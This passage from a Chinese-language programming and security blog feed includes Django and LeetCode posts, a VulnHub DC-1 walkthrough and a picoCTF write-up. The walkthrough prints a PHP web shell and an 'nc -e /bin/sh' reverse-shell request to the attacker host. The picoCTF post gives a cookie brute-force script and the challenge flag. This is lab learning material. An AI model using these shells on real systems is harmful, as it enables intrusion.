        <content type="html"><![CDATA[<h2 id="新增資料-Create"><a href="#新增資料-Create" class="headerlink" title="新增資料(Create)"></a>新增資料(Create)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Create</span>(<span class="params">request</span>):</span><br><span class="line">    Name = <span class="string">&#x27;Andy&#x27;</span></span><br><span class="line">    Sex =  <span class="string">&#x27;M&#x27;</span></span><br><span class="line">    Birthday =  <span class="string">&#x27;2022-02-02&#x27;</span></span><br><span class="line">    Email = <span class="string">&#x27;Andy@gmail.com&#x27;</span></span><br><span class="line">    Phone =  <span class="string">&#x27;0987654321&#x27;</span></span><br><span class="line">    Addr =  <span class="string">&#x27;新北市三重區xx路xx號x樓&#x27;</span></span><br><span class="line">    Class = <span class="string">&#x27;301&#x27;</span></span><br><span class="line">    ClassOfficers = <span class="string">&#x27;班長&#x27;</span></span><br><span class="line">    data = student.objects.create(Name=Name, Sex=Sex, Birthday=Birthday, Email=Email,Phone=Phone, Addr=Addr,Class=Class,</span><br><span class="line">    ClassOfficers=ClassOfficers) </span><br><span class="line">    data.save()  <span class="comment">#寫入資料庫</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;home.html&quot;</span>,<span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><h2 id="讀取資料-Read"><a href="#讀取資料-Read" class="headerlink" title="讀取資料(Read)"></a>讀取資料(Read)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Read</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 取得student所有資料</span></span><br><span class="line">    student_all = student.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="comment"># 取得名字為root的學生(Get用於單個)</span></span><br><span class="line">    Name_root_Get = student.objects.get(Name=<span class="string">&quot;root&quot;</span>)</span><br><span class="line">    <span class="comment"># 取得名字為Andy的學生(Filter用於多個)</span></span><br><span class="line">    Name_Andy_Filter =  student.objects.<span class="built_in">filter</span>(Name=<span class="string">&quot;Andy&quot;</span>)</span><br><span class="line">    <span class="comment"># 取得幹部為班長的學生</span></span><br><span class="line">    ClassOfficers_Filter = student.objects.<span class="built_in">filter</span>(ClassOfficers=<span class="string">&quot;班長&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;home.html&quot;</span>,<span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><h2 id="修改資料-Update"><a href="#修改資料-Update" class="headerlink" title="修改資料(Update)"></a>修改資料(Update)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Update</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 需先取得資料 -&gt; 修改 -&gt; 存擋</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改一筆</span></span><br><span class="line">    Name_root_Get = student.objects.get(Name=<span class="string">&quot;root&quot;</span>)</span><br><span class="line">    Name_root_Get.Birthday = <span class="string">&quot;2022-06-25&quot;</span></span><br><span class="line">    Name_root_Get.Addr = <span class="string">&quot;台北市大安區基隆路xxx號&quot;</span></span><br><span class="line">    Name_root_Get.save() <span class="comment">#存檔</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 修改多筆</span></span><br><span class="line">    ClassOfficers＿Filter = student.objects.<span class="built_in">filter</span>(ClassOfficers=<span class="string">&quot;班長&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> ClassOfficers_Filter:</span><br><span class="line">        x.Commendation += <span class="number">1</span> <span class="comment"># 嘉獎+1</span></span><br><span class="line">    ClassOfficers_Filter.save() </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;home.html&quot;</span>,<span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><h2 id="刪除資料-Delete"><a href="#刪除資料-Delete" class="headerlink" title="刪除資料(Delete)"></a>刪除資料(Delete)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Delete</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 需先取得資料 -&gt; 刪除</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 刪除一筆</span></span><br><span class="line">    Name_root_Get = student.objects.get(Name=<span class="string">&quot;root&quot;</span>)</span><br><span class="line">    Name_root_Get.delete()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 刪除多筆</span></span><br><span class="line">    Name_Andy_Filter = student.objects.<span class="built_in">filter</span>(Name=<span class="string">&quot;Andy&quot;</span>)</span><br><span class="line">    Name_Andy_Filter.delete()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&quot;home.html&quot;</span>,<span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 後端開發 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Django 資料庫建立、註冊</title>
      <link href="/2022/05/31/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-05-31-Django%20%E8%B3%87%E6%96%99%E5%BA%AB%E5%BB%BA%E7%AB%8B%E3%80%81%E8%A8%BB%E5%86%8A/"/>
      <url>/2022/05/31/%E5%BE%8C%E7%AB%AF%E7%9B%B8%E9%97%9C/2022-05-31-Django%20%E8%B3%87%E6%96%99%E5%BA%AB%E5%BB%BA%E7%AB%8B%E3%80%81%E8%A8%BB%E5%86%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="1-建立資料庫模型"><a href="#1-建立資料庫模型" class="headerlink" title="1. 建立資料庫模型"></a>1. 建立資料庫模型</h2><p>編輯models.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">student</span>(models.Model):</span><br><span class="line">    Name = models.CharField(max_length=<span class="number">20</span>, null=<span class="literal">False</span>)</span><br><span class="line">    Sex = models.CharField(max_length=<span class="number">2</span>, default=<span class="string">&#x27;M&#x27;</span>, null=<span class="literal">False</span>)</span><br><span class="line">    Birthday = models.DateField(null=<span class="literal">False</span>)</span><br><span class="line">    Email = models.EmailField(max_length=<span class="number">100</span>, blank=<span class="literal">True</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    Phone = models.CharField(max_length=<span class="number">50</span>, blank=<span class="literal">True</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    Addr = models.CharField(max_length=<span class="number">255</span>,blank=<span class="literal">True</span>, default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    Class = models.CharField(max_length=<span class="number">255</span>,blank=<span class="literal">True</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    ClassOfficers = models.CharField(max_length=<span class="number">255</span>,blank=<span class="literal">True</span>,default=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    Commendation = models.IntegerField(null=<span class="literal">False</span>,blank=<span class="literal">True</span>,default=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.Name</span><br><span class="line"></span><br><span class="line">    <span class="comment"># max_length代表最大長度20字元</span></span><br><span class="line">    <span class="comment"># default=&#x27;M&#x27;代表預設值為M</span></span><br><span class="line">    <span class="comment"># null=False代表不可空白</span></span><br><span class="line">    <span class="comment"># blank=True代表預設空字串</span></span><br><span class="line">    <span class="comment"># editable代表是否可顯示，預設為True</span></span><br><span class="line">    <span class="comment"># unique代表是否為唯一值，預設為False</span></span><br></pre></td></tr></table></figure><h2 id="2-建立migration資料檔"><a href="#2-建立migration資料檔" class="headerlink" title="2. 建立migration資料檔"></a>2. 建立migration資料檔</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br></pre></td></tr></table></figure><h2 id="3-模型與資料庫同步"><a href="#3-模型與資料庫同步" class="headerlink" title="3. 模型與資料庫同步"></a>3. 模型與資料庫同步</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure><h2 id="4-註冊於admin管理後台"><a href="#4-註冊於admin管理後台" class="headerlink" title="4. 註冊於admin管理後台"></a>4. 註冊於admin管理後台</h2><p>編輯admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> studentsapp.models <span class="keyword">import</span> student</span><br><span class="line">admin.site.register(student,studentAdmin)</span><br></pre></td></tr></table></figure><h2 id="5-建立後台管理使用者"><a href="#5-建立後台管理使用者" class="headerlink" title="5. 建立後台管理使用者"></a>5. 建立後台管理使用者</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py createsuperuser</span><br></pre></td></tr></table></figure><h2 id="6-啟動伺服器"><a href="#6-啟動伺服器" class="headerlink" title="6. 啟動伺服器"></a>6. 啟動伺服器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 後端開發 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Django </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode[202] Happy Number</title>
      <link href="/2022/03/22/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-03-22-LeetCode-Happy_Number/"/>
      <url>/2022/03/22/%E7%A8%8B%E5%BC%8F%E6%BC%94%E7%AE%97/2022-03-22-LeetCode-Happy_Number/</url>
      
        <content type="html"><![CDATA[<h2 id="1-題目"><a href="#1-題目" class="headerlink" title="1. 題目"></a>1. 題目</h2><p>Write an algorithm to determine if a number is “happy”.</p><p>A happy number is a number defined by the following process: Starting with any positive integer, replace the number by the sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.</p><p>Example:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 19</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure><p>Explanation:</p><ul><li>1 * 1 + 9 * 9 &#x3D; 82</li><li>8 * 8 + 2 * 2 &#x3D; 68</li><li>6 * 6 + 8 * 8 &#x3D; 100</li><li>1 * 1 + 0 * 0 + 0 * 0 &#x3D; 1</li></ul><h2 id="2-思路"><a href="#2-思路" class="headerlink" title="2. 思路"></a>2. 思路</h2><p>因為不是Happy number的話會進入迴圈 (loops endlessly in a cycle) 所以可想到 <a href="https://en.wikipedia.org/wiki/Cycle_detection">floyd’s cycle detection</a></p><h2 id="3-解題"><a href="#3-解題" class="headerlink" title="3.解題"></a>3.解題</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">check_happy</span><span class="params">(<span class="type">int</span> target)</span></span><br><span class="line">&#123;    </span><br><span class="line">    <span class="type">int</span> sum = (target % <span class="number">10</span>)*(target % <span class="number">10</span>);    </span><br><span class="line">    <span class="comment">/* Chech digit */</span></span><br><span class="line">    <span class="keyword">while</span> ((target / <span class="number">10</span>) &gt; <span class="number">0</span>) &#123;              </span><br><span class="line">        target /= <span class="number">10</span>;</span><br><span class="line">        sum += (target % <span class="number">10</span>)*(target % <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fast = n, slow = n;</span><br><span class="line">    <span class="keyword">do</span> &#123;  </span><br><span class="line">        <span class="comment">/* slow calculate once per round*/</span></span><br><span class="line">        slow = check_happy(slow);</span><br><span class="line">        <span class="comment">/* fast calculate two times per round*/</span></span><br><span class="line">        fast = check_happy(fast);</span><br><span class="line">        fast = check_happy(fast);</span><br><span class="line">        <span class="keyword">if</span> (slow == <span class="number">1</span> || fast == <span class="number">1</span>)        </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;        </span><br><span class="line">    &#125; <span class="keyword">while</span> (slow != fast);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 程式演算 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 Mac 運行x86機器的簡單方法</title>
      <link href="/2022/03/20/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/"/>
      <url>/2022/03/20/%E5%A5%BD%E7%94%A8%E5%B7%A5%E5%85%B7/2022-03-20-M1-Mac-X86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>換了人生中第一台macbook,但是卻是arm架構的,很多軟體還不是很支援,試了用qemu裝vm也試了rdp port-forwaring 回去,但前者不知道為什麼很耗電而後者很吃網路的狀況,最後！我找到了我的救星那就是Lima!</p><h1 id="Lima-VM"><a href="#Lima-VM" class="headerlink" title="Lima-VM"></a>Lima-VM</h1><p>是一個可以使用qemu模擬x86的開源軟體且非常輕量</p><p><a href="https://github.com/lima-vm/lima">Lima Github Repo</a></p><h1 id="安裝方法"><a href="#安裝方法" class="headerlink" title="安裝方法"></a>安裝方法</h1><h2 id="使用brew安裝"><a href="#使用brew安裝" class="headerlink" title="使用brew安裝"></a>使用brew安裝</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install lima</span><br></pre></td></tr></table></figure><h2 id="撰寫config檔案-yaml格式"><a href="#撰寫config檔案-yaml格式" class="headerlink" title="撰寫config檔案(yaml格式)"></a>撰寫config檔案(yaml格式)</h2><p>這邊直接上我的配置,新增檔案 ubuntu-22_04.yaml</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># if using specific environment, add `arch` here to specify the architecture</span></span><br><span class="line"><span class="attr">arch:</span> <span class="string">&quot;x86_64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu-22.04.yaml example from lima official (here is all the same as the official example)</span></span><br><span class="line"><span class="attr">images:</span></span><br><span class="line"><span class="comment"># Try to use release-yyyyMMdd image if available. Note that release-yyyyMMdd will be removed after several months.</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;https://cloud-images.ubuntu.com/releases/22.04/release-20221214/ubuntu-22.04-server-cloudimg-amd64.img&quot;</span></span><br><span class="line"><span class="attr">arch:</span> <span class="string">&quot;x86_64&quot;</span></span><br><span class="line"><span class="attr">digest:</span> <span class="string">&quot;sha256:b9a5a216901c34742ffe662b691db114269aaa25c90eb77f3ef4dd4f818e78a3&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;https://cloud-images.ubuntu.com/releases/22.04/release-20221214/ubuntu-22.04-server-cloudimg-arm64.img&quot;</span></span><br><span class="line"><span class="attr">arch:</span> <span class="string">&quot;aarch64&quot;</span></span><br><span class="line"><span class="attr">digest:</span> <span class="string">&quot;sha256:b27163374c834c770e8db023fb21205529cea494257bf5ba866b8b1ae5969164&quot;</span></span><br><span class="line"><span class="comment"># Fallback to the latest release image.</span></span><br><span class="line"><span class="comment"># Hint: run `limactl prune` to invalidate the cache</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-amd64.img&quot;</span></span><br><span class="line"><span class="attr">arch:</span> <span class="string">&quot;x86_64&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;https://cloud-images.ubuntu.com/releases/22.04/release/ubuntu-22.04-server-cloudimg-arm64.img&quot;</span></span><br><span class="line"><span class="attr">arch:</span> <span class="string">&quot;aarch64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mount the host&#x27;s $HOME directory to the guest&#x27;s /home/ubuntu</span></span><br><span class="line"><span class="comment"># if need writable, add `writable: true` under the mount</span></span><br><span class="line"><span class="attr">mounts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;~&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">location:</span> <span class="string">&quot;/tmp/lima&quot;</span></span><br><span class="line">  <span class="attr">writable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="啟動Lima與配置"><a href="#啟動Lima與配置" class="headerlink" title="啟動Lima與配置"></a>啟動Lima與配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limactl start ubuntu-22_04.yaml --name ubuntu-22_04-amd64</span><br></pre></td></tr></table></figure><p>看到 INFO[xxxx] READY. Run lima to open the shell 就代表成功了</p><h2 id="進入shell"><a href="#進入shell" class="headerlink" title="進入shell"></a>進入shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limactl shell ubuntu-22_04-amd64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 好用工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架構 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-DC1</title>
      <link href="/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/"/>
      <url>/2022/03/20/%E6%BB%B2%E9%80%8F%E6%B8%AC%E8%A9%A6/2022-03-20-VulnHub-DC1/</url>
      
        <content type="html"><![CDATA[<h1 id="尋找DC-1靶機"><a href="#尋找DC-1靶機" class="headerlink" title="尋找DC-1靶機"></a>尋找DC-1靶機</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nmap 10.0.2.4 -A -p-</span><br></pre></td></tr></table></figure><h1 id="發現有port-80-直接瀏覽網頁"><a href="#發現有port-80-直接瀏覽網頁" class="headerlink" title="發現有port 80 -&gt; 直接瀏覽網頁"></a>發現有port 80 -&gt; 直接瀏覽網頁</h1><p><img src="https://i.imgur.com/I1N1wgZ.png"></p><h1 id="使用wappalyzer得知使用Drupal-7"><a href="#使用wappalyzer得知使用Drupal-7" class="headerlink" title="使用wappalyzer得知使用Drupal 7"></a>使用wappalyzer得知使用Drupal 7</h1><p><img src="https://i.imgur.com/B8nHsAB.png"></p><h1 id="搜尋已知Exploit來取得RCE"><a href="#搜尋已知Exploit來取得RCE" class="headerlink" title="搜尋已知Exploit來取得RCE"></a>搜尋已知Exploit來取得RCE</h1><ul><li>CVE-2018-7600<blockquote><p>Exploit:<a href="https://github.com/dreadlocked/Drupalgeddon2">https://github.com/dreadlocked/Drupalgeddon2</a></p></blockquote></li></ul><h1 id="ls-發現flag1"><a href="#ls-發現flag1" class="headerlink" title="ls -&gt; 發現flag1"></a>ls -&gt; 發現flag1</h1><p><img src="https://i.imgur.com/4pA9CSv.png"></p><h1 id="發現有shell-php"><a href="#發現有shell-php" class="headerlink" title="發現有shell.php"></a>發現有shell.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>])) &#123; <span class="title function_ invoke__">system</span>( <span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>] . <span class="string">&#x27; 2&gt;&amp;1 &#x27;</span>);&#125;&gt;</span><br></pre></td></tr></table></figure><h1 id="使用nc-監聽取回reverse-shell-python-pty"><a href="#使用nc-監聽取回reverse-shell-python-pty" class="headerlink" title="使用nc 監聽取回reverse shell(python pty)"></a>使用nc 監聽取回reverse shell(python pty)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://10.0.2.4/shell.php?c=nc%20-e%20%2Fbin%2Fsh%2010.0.2.15%208080</span><br><span class="line">nc -e /bin/sh 10.0.2.15 8080</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 滲透測試 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoCTF Cookies [40points]</title>
      <link href="/2022/03/20/CTF/picoCTF/Web%20Exploitation/Cookies/2022-03-20-Cookies/"/>
      <url>/2022/03/20/CTF/picoCTF/Web%20Exploitation/Cookies/2022-03-20-Cookies/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-Exploitation-Cookies-40points"><a href="#Web-Exploitation-Cookies-40points" class="headerlink" title="[Web Exploitation] Cookies - 40points"></a>[Web Exploitation] Cookies - 40points</h1><p>初始畫面<br><img src="https://i.imgur.com/JCj8GL7.png" alt="Image"></p><p>輸入snickerdoodle，發現進入畫面不一樣<br><img src="https://i.imgur.com/R2hIkU3.png" alt="Image"></p><p>嘗試撰寫暴力破解腳本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    cookie = <span class="string">&#x27;name=&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    headers = &#123;<span class="string">&#x27;Cookie&#x27;</span>:cookie&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://mercury.picoctf.net:&lt;port&gt;/check&#x27;</span>, headers=headers)</span><br><span class="line"><span class="keyword">if</span> (r.status_code == <span class="number">200</span>) <span class="keyword">and</span> (<span class="string">&#x27;picoCTF&#x27;</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>取得FLAG<br><img src="https://i.imgur.com/yDhWHOX.png" alt="Image"></p><p>FLAG:picoCTF{3v3ry1_l0v3s_c00k135_064663be}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> picoCTF </tag>
            
            <tag> Web Exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>彩色的Ascii Banner</title>
      <link href="/2022/03/18/Linux/2022-03-18-colorful-banner/"/>
      <url>/2022/03/18/Linux/2022-03-18-colorful-banner/</url>
      
        <content type="html"><![CDATA[<h2 id="1-安裝"><a href="#1-安裝" class="headerlink" title="1. 安裝"></a>1. 安裝</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install figlet lolcat</span><br></pre></td></tr></table></figure><h2 id="2-下載字形檔案"><a href="#2-下載字形檔案" class="headerlink" title="2.下載字形檔案"></a>2.下載字形檔案</h2><p><a href="https://github.com/xero/figlet-fonts">figlet-fonts</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/xero/figlet-fonts.git</span><br></pre></td></tr></table></figure><h2 id="3-複製到figlet目錄"><a href="#3-複製到figlet目錄" class="headerlink" title="3.複製到figlet目錄"></a>3.複製到figlet目錄</h2><p><img src="https://i.imgur.com/TCfBBzR.png"></p><h2 id="4-使用方式"><a href="#4-使用方式" class="headerlink" title="4.使用方式"></a>4.使用方式</h2><p><img src="https://i.imgur.com/2IRXRc3.png"></p><h2 id="5-加入到-bashrc"><a href="#5-加入到-bashrc" class="headerlink" title="5.加入到~&#x2F;.bashrc"></a>5.加入到~&#x2F;.bashrc</h2><p><img src="https://i.imgur.com/P4FZgbF.png"></p><h2 id="6-完成"><a href="#6-完成" class="headerlink" title="6.完成"></a>6.完成</h2><p><img src="https://i.imgur.com/YM27FuL.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 優化設置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnable start [100pt]</title>
      <link href="/2022/03/18/CTF/pwnable/2022-03-18-pwnable-start/"/>
      <url>/2022/03/18/CTF/pwnable/2022-03-18-pwnable-start/</url>
      
        <content type="html"><![CDATA[<h2 id="看保護機制"><a href="#看保護機制" class="headerlink" title="看保護機制"></a>看保護機制</h2><blockquote><p>checksec start</p></blockquote><p><img src="https://i.imgur.com/27SRlvR.png"></p><h2 id="看源碼"><a href="#看源碼" class="headerlink" title="看源碼"></a>看源碼</h2><blockquote><p>objdump -d -M intel start</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 